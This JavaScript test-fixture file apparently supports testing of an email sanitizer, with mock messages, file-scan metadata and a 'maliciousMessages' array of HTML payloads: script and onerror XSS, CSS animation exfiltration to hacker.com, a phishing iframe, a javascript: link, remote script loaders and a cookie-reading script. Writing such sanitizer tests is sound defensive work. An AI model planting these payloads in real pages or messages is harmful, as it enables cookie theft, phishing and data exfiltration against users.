export const messages = [
  {
    id: "1",
    subject: "Test message",
    createdAt: "2021-01-01",
    threadName: "Test thread",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt",
    plainText: "Test plain text",
    richText: "Test rich text",
    isSeen: false,
    securityLevel: "confidential",
    attachments: ["123", "124"],
  },
  {
    id: "2",
    subject: "Test message 2",
    createdAt: "2021-01-02",
    threadName: "Test thread 2",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt 2",
    plainText: "Test plain text 2",
    richText: "Test rich text 2",
    isSeen: true,
    securityLevel: "public",
    attachments: ["125", "126"],
  },
  {
    id: "3",
    subject: "Test message 3",
    createdAt: "2021-01-03",
    threadName: "Test thread 3",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt 3",
    plainText: "Test plain text 3",
    richText: "Test rich text 3",
    isSeen: false,
    securityLevel: "confidential",
    attachments: ["123", "124"],
  },
  {
    id: "4",
    subject: "Test message 4",
    createdAt: "2021-01-04",
    threadName: "Test thread 4",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt 4",
    plainText: "Test plain text 4",
    richText: "Test rich text 4",
    isSeen: true,
    securityLevel: "public",
    attachments: ["125", "126"],
  },
]

export const maliciousMessages = [
  {
    id: "1",
    subject: "Script Injection Attempt",
    createdAt: "2021-01-01",
    threadName: "Test thread",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt",
    plainText: "Test plain text",
    richText: `
      <p>Normal email content</p>
      <script>alert('XSS attack!');</script>
      <img src="x" onerror="alert('HTML attribute attack')" />
    `,
  },
  {
    id: "2",
    subject: "CSS Exfiltration Attempt",
    createdAt: "2021-01-02",
    threadName: "Test thread 2",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt 2",
    plainText: "Test plain text 2",
    richText: `
      <style>
        @keyframes exfil {
          from { background: url('http://hacker.com/?leak=start'); }
          to { background: url('http://hacker.com/?leak=end'); }
        }
        body { animation: exfil 10s infinite; }
      </style>
      <p>Seems innocent but has CSS data exfiltration</p>
    `,
  },
  {
    id: "3",
    subject: "IFrame Phishing Attempt",
    createdAt: "2021-01-03",
    threadName: "Test thread 3",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt 3",
    plainText: "Test plain text 3",
    richText: `
      <p>Your account needs verification:</p>
      <iframe 
        src="https://fake-login-page.com" 
        style="width:100%;height:500px"
      ></iframe>
    `,
  },
  {
    id: "4",
    subject: "JavaScript URI Attack",
    createdAt: "2021-01-04",
    threadName: "Test thread 4",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt 4",
    plainText: "Test plain text 4",
    richText: `
      <a href="javascript:alert('Session hijacked')">
        Click here for special offer
      </a>
    `,
  },
  {
    id: "5",
    subject: "External Resource Loader",
    createdAt: "2021-01-05",
    threadName: "Test thread 5",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt 5",
    plainText: "Test plain text 5",
    richText: `
      <link rel="stylesheet" href="http://malicious-css.com/exploit.css">
      <script src="http://malicious-js.com/attack.js"></script>
      <p>This content tries to load external resources</p>
    `,
  },
  {
    id: "6",
    subject: "Read user cookies",
    createdAt: "2021-01-06",
    threadName: "Test thread 6",
    organisationId: "123",
    recipientUserId: "456",
    excerpt: "Test excerpt 6",
    plainText: "Test plain text 6",
    richText: `
      <script>
        document.cookie.split(';').forEach(function(c) {
          console.log(c);
        });
        document.body.appendChild(document.createElement('p')).textContent = document.cookie;
        window.alert(document.cookie);
      </script>
      <p>This content is safe</p>
    `,
  },
]

export const meta = [
  {
    fileName: "Test file",
    id: "123",
    key: "test-key",
    ownerId: "456",
    fileSize: 100,
    mimeType: "text/plain",
    createdAt: "2021-01-01",
    lastScan: "2021-01-01",
    deleted: false,
    infected: false,
    infectionDescription: "Test infection description",
    antivirusDbVersion: "1.0.0",
    expiresAt: "2021-01-01",
  },
  {
    fileName: "Test file 2",
    id: "124",
    key: "test-key-2",
    ownerId: "457",
    fileSize: 200,
    mimeType: "text/plain",
    createdAt: "2021-01-02",
    lastScan: "2021-01-02",
    deleted: false,
    infected: false,
    infectionDescription: "Test infection description 2",
    antivirusDbVersion: "1.0.0",
  },
  {
    fileName: "Test file 3",
    id: "125",
    key: "test-key-3",
    ownerId: "458",
    fileSize: 300,
    mimeType: "text/plain",
    createdAt: "2021-01-03",
    lastScan: "2021-01-03",
    deleted: false,
    infected: true,
    infectionDescription: "Test infection description 3",
    antivirusDbVersion: "1.0.0",
    expiresAt: "2021-01-03",
  },
  {
    fileName: "Test file 4",
    id: "126",
    key: "test-key-4",
    ownerId: "459",
    fileSize: 400,
    mimeType: "text/plain",
    createdAt: "2021-01-04",
    lastScan: "2021-01-04",
    deleted: true,
    infected: true,
    infectionDescription: "Test infection description 4",
    antivirusDbVersion: "1.0.0",
  },
]
